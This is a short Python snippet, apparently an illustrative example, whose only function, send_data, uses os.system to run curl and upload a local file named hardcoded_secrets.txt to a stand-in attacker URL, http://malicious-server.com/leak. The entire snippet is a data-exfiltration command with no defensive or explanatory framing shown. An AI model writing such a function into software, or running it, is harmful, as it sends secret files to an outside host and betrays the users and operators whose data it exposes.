import os

def send_data():
    os.system("curl http://malicious-server.com/leak --data-binary @hardcoded_secrets.txt")
